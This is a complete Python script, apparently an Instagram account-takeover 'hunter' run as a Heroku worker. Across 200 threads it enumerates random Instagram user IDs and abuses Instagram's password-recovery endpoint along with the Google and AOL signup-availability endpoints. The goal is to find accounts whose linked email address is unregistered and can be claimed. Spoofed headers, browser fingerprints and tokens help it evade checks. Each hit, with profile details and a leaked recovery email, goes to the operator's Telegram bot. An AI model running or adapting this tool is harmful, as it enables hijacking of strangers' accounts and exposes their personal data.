import os
import requests
import random
import json
import string
import time
import re
import hashlib
import uuid
from threading import Thread, Lock
from user_agent import generate_user_agent as ggb
from colorama import Fore, Style, init
from cfonts import render

# Initialize colorama
init(autoreset=True)

# Read Heroku environment variables
CHAT_ID = os.getenv('CHAT_ID')
TOKEN = os.getenv('TOKEN')
YEAR = os.getenv('YEAR', '0')  # '1'..'9' or '0' for full range

if not (CHAT_ID and TOKEN):
    raise RuntimeError("❌ CHAT_ID and TOKEN must be set as environment variables.")

# Pre-launch banner (appears in Heroku logs)
banner = render('{PRINCE}', colors=['white', 'red'], align='center')
print(f"\n{banner}\n")
print(Style.BRIGHT + Fore.CYAN + "🔄 Meta Hunter Worker starting on Heroku...\n")

# Counters and locks
aca = total = hits = badinsta = bademail = goodig = 0
infoinsta = {}
counter_lock = Lock()

# For print frequency control
last_status_time = 0
status_lock = Lock()

# Determine bbk and id_max based on YEAR env var
try:
    yr = int(YEAR)
except:
    yr = 0

if yr == 1:
    bbk = 10000
    id_max = 17699999
elif yr == 2:
    bbk = 17699999
    id_max = 263014407
elif yr == 3:
    bbk = 263014407
    id_max = 361365133
elif yr == 4:
    bbk = 361365133
    id_max = 1629010000
elif yr == 5:
    bbk = 1629010000
    id_max = 2500000000
elif yr == 6:
    bbk = 2500000000
    id_max = 3713668786
elif yr == 7:
    bbk = 3713668786
    id_max = 5699785217
elif yr == 8:
    bbk = 5699785217
    id_max = 8597939245
elif yr == 9:
    bbk = 8597939245
    id_max = 21254029834
else:
    # Default: full range 2010–2023
    bbk = 10000
    id_max = 21254029834

def pppp():
    global last_status_time, hits, badinsta, bademail, goodig
    with status_lock:
        now = time.time()
        if now - last_status_time > 5:  # Only print every 5 seconds
            status = (
                f"Hits: {hits}  | "
                f"Bad Insta: {badinsta}  | "
                f"Bad Mail: {bademail}  | "
                f"Good IG: {goodig}"
            )
            print(Fore.YELLOW + status)
            last_status_time = now

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.get(url, params={"chat_id": CHAT_ID, "text": message})
    except Exception as e:
        print(Fore.RED + f"Telegram send error: {e}")

def rest(user):
    try:
        response = requests.post(
            'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
            headers={'User-Agent': ggb()},
            data={
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + 
                               json.dumps({
                                   '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                                   'adid': str(uuid.uuid4()),
                                   'guid': str(uuid.uuid4()),
                                   'device_id': 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16],
                                   'query': user
                               })
            }
        )
        return response.json().get('email', 'no REST !')
    except:
        return 'no REST !'

def check_gmail(email):
    global hits, bademail
    try:
        local = email.split('@')[0] if '@' in email else email
        line = open('tl.txt', 'r').read().splitlines()[0]
        tl, host = line.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
            'user-agent': ggb(),
        }
        params = {'TL': tl}
        data = (
            'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{local}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&'
            'azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&'
            'deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&'
            'gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        response = requests.post(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data
        )
        if '"gf.uar",1' in response.text:
            with counter_lock:
                hits += 1
            pppp()
            if '@' not in email:
                ok = local + '@gmail.com'
                username, domain = ok.split('@')
                InfoAcc(username, domain)
            else:
                username, domain = email.split('@')
                InfoAcc(username, domain)
        else:
            with counter_lock:
                bademail += 1
            pppp()
    except Exception:
        with counter_lock:
            bademail += 1
        pppp()

def check_aol(email):
    global hits, bademail
    try:
        name = email.split('@')[0] if '@' in email else email
        with open("aol_req.txt", "r") as f:
            specData, specId, crumb, sessionIndex, acrumb = f.read().strip().split('Π')
        with open("aol_cok.txt", "r") as f:
            cookies = eval(f.read().strip())
        headers = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edge/120.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {'validateField': 'userId'}
        data = (
            f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C'
            f'%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C'
            f'%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C'
            f'%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C'
            f'%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C'
            f'%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C'
            f'%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C'
            f'%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C'
            f'%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20'
            f'(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20'
            f'Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C'
            f'%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C'
            f'%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B'
            f'%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C'
            f'%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C'
            f'%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C'
            f'%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C'
            f'%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D'
            f'&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&'
            f'done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&'
            f'specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&'
            f'lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006##$$&'
            f'mm=10&dd=24&yyyy=2000&signup='
        )
        res = requests.post(
            'https://login.aol.com/account/module/create',
            params=params,
            headers=headers,
            data=data,
            cookies=cookies
        ).text
        if '{"errors":[]}' in res:
            with counter_lock:
                hits += 1
            pppp()
            if '@' not in email:
                ok = name + '@aol.com'
                username, domain = ok.split('@')
                InfoAcc(username, domain)
            else:
                username, domain = email.split('@')
                InfoAcc(username, domain)
        else:
            with counter_lock:
                bademail += 1
            pppp()
    except Exception:
        with counter_lock:
            bademail += 1
        pppp()

def check(email):
    global goodig, badinsta
    try:
        ua = ggb()
        device_id = 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            'User-Agent': ua,
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                           json.dumps({
                               '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                               'adid': uui,
                               'guid': uui,
                               'device_id': device_id,
                               'query': email
                           }),
            'ig_sig_key_version': '4',
        }
        response = requests.post(
            'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
            headers=headers,
            data=data
        ).text
        if email in response:
            if '@gmail.com' in email:
                check_gmail(email)
            else:
                check_aol(email)
            with counter_lock:
                goodig += 1
            pppp()
        else:
            with counter_lock:
                badinsta += 1
            pppp()
    except Exception:
        with counter_lock:
            badinsta += 1
        pppp()

def InfoAcc(username, domain):
    global total
    with counter_lock:
        total += 1

    rr = infoinsta.get(username, {})
    Id = rr.get('pk', '')
    full_name = rr.get('full_name', '')
    fows = rr.get('follower_count', '')
    fowg = rr.get('following_count', '')
    pp_count = rr.get('media_count', '')
    isPraise = rr.get('is_private', '')
    bio = rr.get('biography', '')
    is_verified = rr.get('is_verified', '')
    bizz = rr.get('is_business', '')

    try:
        meta = int(fows) >= 10 and int(pp_count) >= 2
    except:
        meta = False

    rest_info = rest(username)

    ss = (
        f"• HIT FROM PRINCE BABY •\n"
        "───────────────────\n"
        f"Hit: {total}\n"
        f"Is Meta Enabled: {meta}\n"
        f"Is Business: {bizz}\n"
        f"Is Verified: {is_verified}\n"
        f"Follower: {fows}\n"
        f"Following: {fowg}\n"
        f"Post: {pp_count}\n"
        f"Bio: {bio}\n"
        f"Private: {isPraise}\n"
        f"Full Name: {full_name}\n"
        f"ID: {Id}\n"
        f"Domain: {domain}\n"
        f"Username: @{username}\n"
        f"E-Mail: {username}@{domain}\n"
        f"Rest: {rest_info}\n"
        f"URL: https://www.instagram.com/{username}\n"
        "───────────────────\n"
        "𝐁𝐘 @ankuuxx | 𝐉𝐎𝐈𝐍 @Raosahab_ankuu"
    )

    with open('ANI2TO.txt', 'a') as ff:
        ff.write(ss + "\n\n")

    send_telegram(ss)

def tll():
    try:
        yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(random.choice(yy) for _ in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice(yy) for _ in range(random.randrange(3, 9)))
        host = ''.join(random.choice(yy) for _ in range(random.randrange(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "user-agent": ggb(),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
            headers=he3
        )
        tok = re.search(
            r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = response.text.split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', host)
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(Fore.RED + f"tll error: {e}")
        tll()

def Getaol():
    try:
        qq = requests.get(
            'https://login.aol.com/account/create',
            headers={
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                              'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edge/120.0.0.0',
                'accept-language': 'en-US,en;q=0.9',
            }
        )
        cookies = qq.cookies.get_dict()
        tm1 = str(int(time.time()))
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
            '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
            'cmp': f't={tm1}&j=0&u=1---',
        })
        specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
        for fname in ('aol_req.txt', 'aol_cok.txt'):
            try:
                os.remove(fname)
            except:
                pass
        with open('aol_req.txt', 'w') as t:
            t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")
        with open('aol_cok.txt', 'w') as g:
            g.write(str(cookies) + "\n")
    except Exception as e:
        print(Fore.RED + f"Getaol error: {e}")
        Getaol()

def gg_worker():
    while True:
        try:
            rand_id = random.randrange(bbk, id_max)
            data = {
                "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                "variables": json.dumps({"id": rand_id, "render_surface": "PROFILE"}),
                "doc_id": "25618261841150840"
            }
            headers = {
                "X-FB-LSD": data["lsd"],
                "User-Agent": ggb(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
                "Origin": "https://www.instagram.com",
                "Referer": "https://www.instagram.com/",
            }
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers=headers,
                data=data
            )
            try:
                json_data = response.json()
                user_data = json_data.get('data', {}).get('user')
                if not isinstance(user_data, dict):
                    # print(Fore.RED + "⚠️ user_data is missing or invalid")
                    continue
                username = user_data.get('username')
                if username:
                    infoinsta[username] = user_data
                    emails = [f"{username}@gmail.com", f"{username}@aol.com"]
                    for email in emails:
                        check(email)
            except Exception as e:
                # print(Fore.RED + "[JSON ERROR] Failed to parse response:")
                # print("Status Code:", response.status_code)
                # print("Response Text:", response.text[:500])
                continue
        except Exception as e:
            # print(Fore.RED + f"❌ Error in gg_worker: {e}")
            continue

if __name__ == "__main__":
    tll()
    Getaol()
    THREADS = int(os.getenv('THREADS', '200'))  # Default 10, can be set in env
    for _ in range(THREADS):
        Thread(target=gg_worker, daemon=True).start()
    while True:
        time.sleep(0.9)
